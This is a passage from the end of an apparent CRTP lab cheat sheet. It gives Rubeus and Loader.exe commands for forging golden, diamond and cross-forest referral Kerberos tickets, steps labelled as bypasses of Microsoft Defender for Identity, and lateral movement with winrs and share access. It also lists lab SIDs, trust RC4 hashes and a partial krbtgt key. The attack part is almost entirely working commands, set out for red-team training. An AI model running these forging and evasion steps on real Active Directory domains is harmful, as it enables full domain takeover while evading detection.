│  ── OBJ 19: GOLDEN TICKET (KRBTGT HASH) ───────────────────────────────  │
│                                                                          │
│  # Forge and inject in one step                                          │
│  Loader.exe -path Rubeus.exe -args evasive-golden                        │
│    /user:Administrator /id:500                                           │
│    /domain:dollarcorp.moneycorp.local                                    │
│    /sid:<dcorp_sid> /sids:<mcorp_ea_sid-519>                             │
│    /aes256:<krbtgt_aes256> /netbios:dcorp /ptt                          │
│                                                                          │
│  winrs -r:mcorp-dc.moneycorp.local cmd                                  │
│                                                                          │
│  ── MDI BYPASS: DC IDENTITY ────────────────────────────────────────────  │
│                                                                          │
│  Rubeus.exe golden /aes256:<krbtgt_aes256>                               │
│    /user:dcorp-dc$ /id:1000                                              │
│    /domain:dollarcorp.moneycorp.local /sid:<dcorp_sid>                   │
│    /sids:<mcorp_sid>-516,S-1-5-9                                         │
│    /dc:dcorp-dc.dollarcorp.moneycorp.local /ptt                         │
│                                                                          │
│  ── MDI BYPASS: DIAMOND TICKET ─────────────────────────────────────────  │
│                                                                          │
│  Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes      │
│    /ticketuser:dcorp-dc$ /ticketuserid:1000                              │
│    /domain:dollarcorp.moneycorp.local                                    │
│    /dc:dcorp-dc.dollarcorp.moneycorp.local                               │
│    /sids:<mcorp_sid>-516,S-1-5-9                                         │
│    /createnetonly:C:\Windows\System32\cmd.exe /show /ptt                │
│                                                                          │
│  ── OBJ 20: CROSS-FOREST (NO SID HISTORY) ─────────────────────────────  │
│                                                                          │
│  # Forge referral ticket (no /sids — filtering active)                   │
│  Loader.exe -path Rubeus.exe -args evasive-silver                        │
│    /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL                            │
│    /rc4:<ecorp_trust_rc4> /sid:<dcorp_sid>                               │
│    /ldap /user:Administrator /nowrap                                     │
│                                                                          │
│  # Request CIFS service ticket                                           │
│  Loader.exe -path Rubeus.exe -args asktgs                                │
│    /service:cifs/eurocorp-dc.eurocorp.LOCAL                              │
│    /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:<base64>                 │
│                                                                          │
│  dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\                      │
│                                                                          │
│  ── KEY VALUES (CRTP LAB) ─────────────────────────────────────────────  │
│                                                                          │
│  dcorp SID    : S-1-5-21-719815819-3726368948-3917688648                 │
│  mcorp SID    : S-1-5-21-335606122-960912869-3279953914                  │
│  mcorp EA SID : S-1-5-21-335606122-960912869-3279953914-519              │
│  mcorp DC SID : S-1-5-21-335606122-960912869-3279953914-516              │
│  Ent DC SID   : S-1-5-9                                                  │
│  mcorp trust  : rc4=132f54e05f7c3db02e97c00ff3879067                     │
│  ecorp trust  : rc4=163373571e6c3e09673010fd60accdf0                     │
│  dcorp krbtgt : aes256=154cb6624b1d859f7080a6615adc488f09f928...         │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## References

- [Altered Security — CRTP Course](https://www.alteredsecurity.com/redteamlab)
- [Microsoft Docs — sIDHistory Attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory)
- [GentilKiwi — Mimikatz lsadump::trust](https://github.com/gentilkiwi/mimikatz)
- [GhostPack — Rubeus](https://github.com/GhostPack/Rubeus)
- [SpecterOps — Kerberos Diamond Tickets](https://www.semperis.com/blog/a-diamond-in-the-rough/)
- [Microsoft Docs — SID Filtering](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e84519f0-f62c-4e51-8ea1-5fc1e97e38c3)
